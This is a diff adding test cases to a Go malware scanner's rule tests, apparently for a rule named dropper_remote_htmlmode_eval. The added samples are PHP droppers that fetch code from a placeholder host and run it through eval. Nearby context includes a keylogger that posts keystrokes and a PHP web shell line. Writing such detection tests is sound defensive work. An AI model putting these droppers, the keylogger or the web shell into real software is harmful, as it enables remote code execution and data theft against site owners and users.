@@ -267,6 +267,64 @@ system($_GET['cmd']);`,
 			sample: `document.addEventListener('keypress',function(e){` +
 				`fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`,
 		},
+		{
+			name: "remote helper feeding HTML-mode eval",
+			rule: "dropper_remote_htmlmode_eval",
+			want: true,
+			sample: `<?php
+function fetchContent($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $content = curl_exec($ch);
+    return $content;
+}
+$url = 'https://payload.example.test/raw.php';
+$content = fetchContent($url);
+if ($content !== false) { eval('?>' . $content); }`,
+		},
+		{
+			name: "direct remote read feeding HTML-mode eval",
+			rule: "dropper_remote_htmlmode_eval",
+			want: true,
+			sample: `<?php
+$payload = file_get_contents('https://payload.example.test/stage.php');
+eval('?>' . $payload);`,
+		},
+		{
+			name: "unrelated HTTP client and local template evaluator",
+			rule: "dropper_remote_htmlmode_eval",
+			sample: `<?php
+function request($url) {
+    $ch = curl_init($url);
+    $content = curl_exec($ch);
+    return $content;
+}
+$response = request('https://api.example.test/data');
+function render($path) {
+    $content = file_get_contents($path);
+    return eval('?>' . $content);
+}`,
+		},
+		{
+			name: "unrelated flat network and local-template flows",
+			rule: "dropper_remote_htmlmode_eval",
+			sample: `<?php
+$url = 'https://api.example.test/data';
+$response = curl_exec($client);
+$template = file_get_contents(__DIR__ . '/views/page.tpl');
+eval('?>' . $template);`,
+		},
+		{
+			name:   "HTML-mode eval without network source",
+			rule:   "dropper_remote_htmlmode_eval",
+			sample: `<?php $content = load_local_template(); eval('?>' . $content);`,
+		},
+		{
+			name:   "remote fetch without HTML-mode eval",
+			rule:   "dropper_remote_htmlmode_eval",
+			sample: `<?php $url = 'https://api.example.test/data'; $content = curl_exec($ch);`,
+		},
 	}
 
 	for _, tc := range tests {
